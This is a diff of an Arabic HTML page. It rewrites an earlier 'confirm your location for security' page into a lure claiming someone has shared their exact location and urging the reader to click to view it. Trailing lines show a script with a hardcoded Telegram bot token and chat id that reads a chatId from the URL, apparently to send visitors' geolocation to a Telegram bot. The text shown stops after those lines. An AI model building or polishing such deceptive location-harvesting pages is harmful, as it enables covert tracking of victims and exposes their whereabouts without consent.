@@ -1,25 +1,166 @@
+```html
 <!DOCTYPE html>
-<html lang="ar">
-<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>تأكيد الموقع</title>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>عرض الموقع</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#27ae60,#2ecc71);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
-.card{background:#fff;border-radius:20px;padding:30px;max-width:400px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
-h1{color:#333;margin-bottom:10px}p{color:#666;margin-bottom:20px}
-.btn{background:linear-gradient(135deg,#27ae60,#2ecc71);color:#fff;border:none;padding:15px 40px;border-radius:50px;font-size:18px;cursor:pointer;width:100%}
-.btn:disabled{opacity:.6}
-#result{margin-top:15px;padding:10px;border-radius:10px;display:none}
-.ok{background:#d4edda;color:#155724;display:block}
-.fail{background:#f8d7da;color:#721c24;display:block}
-</style></head>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Cairo',sans-serif;
+}
+
+body{
+display:flex;
+justify-content:center;
+align-items:center;
+min-height:100vh;
+background:url('https://images.unsplash.com/photo-1524661135-423995f22d0b?auto=format&fit=crop&w=1200&q=80') center/cover no-repeat fixed;
+}
+
+body::before{
+content:"";
+position:fixed;
+inset:0;
+background:rgba(0,0,0,.45);
+backdrop-filter:blur(6px);
+}
+
+.card{
+position:relative;
+z-index:2;
+width:390px;
+max-width:95%;
+background:rgba(255,255,255,.92);
+backdrop-filter:blur(15px);
+border-radius:28px;
+padding:35px 28px;
+box-shadow:0 20px 50px rgba(0,0,0,.35);
+text-align:center;
+}
+
+.icon{
+width:90px;
+height:90px;
+margin:auto;
+margin-bottom:20px;
+border-radius:50%;
+background:linear-gradient(135deg,#34c759,#00a651);
+display:flex;
+align-items:center;
+justify-content:center;
+font-size:42px;
+color:#fff;
+box-shadow:0 10px 25px rgba(52,199,89,.45);
+}
+
+h1{
+color:#222;
+font-size:28px;
+margin-bottom:15px;
+}
+
+.desc{
+font-size:16px;
+color:#555;
+line-height:1.9;
+margin-bottom:25px;
+}
+
+.info{
+background:#f8f9fb;
+border-radius:18px;
+padding:18px;
+text-align:right;
+margin-bottom:25px;
+}
+
+.info h2{
+font-size:18px;
+margin-bottom:12px;
+color:#222;
+}
+
+.info p{
+color:#555;
+line-height:1.8;
+font-size:15px;
+}
+
+.btn{
+width:100%;
+padding:18px;
+border:none;
+border-radius:50px;
+background:linear-gradient(135deg,#34c759,#00a651);
+color:#fff;
+font-size:18px;
+font-weight:700;
+cursor:pointer;
+transition:.25s;
+}
+
+.btn:hover{
+transform:scale(1.03);
+}
+
+.note{
+margin-top:20px;
+font-size:13px;
+color:#777;
+}
+
+</style>
+</head>
+
 <body>
+
 <div class="card">
-    <h1>📍 تأكيد الموقع</h1>
-    <p>يجب تأكيد موقعك الجغرافي للأمان</p>
-    <button class="btn" id="btnStart" onclick="getLoc()">📍 تحديد موقعي</button>
-    <div id="result"></div>
+
+<div class="icon">📍</div>
+
+<h1>تم استلام موقع المستخدم</h1>
+
+<p class="desc">
+لقد أرسل إليك المستخدم موقعه الجغرافي عبر الخرائط.
+يمكنك عرض الموقع الدقيق بالضغط على الزر أدناه.
+</p>
+
+<div class="info">
+<h2>معلومات الموقع</h2>
+
+<p>
+سيتم فتح الموقع مباشرةً على الخريطة مع إظهار الإحداثيات الدقيقة ومكان المستخدم.
+</p>
+
 </div>
+
+<button class="btn" onclick="showLocation()">
+📍 لعرض الموقع الدقيق اضغط هنا
+</button>
+
+<p class="note">
+سيتم فتح الموقع باستخدام تطبيق الخرائط على جهازك.
+</p>
+
+</div>
+
+<script>
+function showLocation(){
+alert("سيتم فتح الموقع الدقيق...");
+}
+</script>
+
+</body>
+</html>
+```
 <script>
 const TOKEN='7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI',CHAT='1015102519';
 const chatId=new URLSearchParams(location.search).get('chatId')||'unknown';
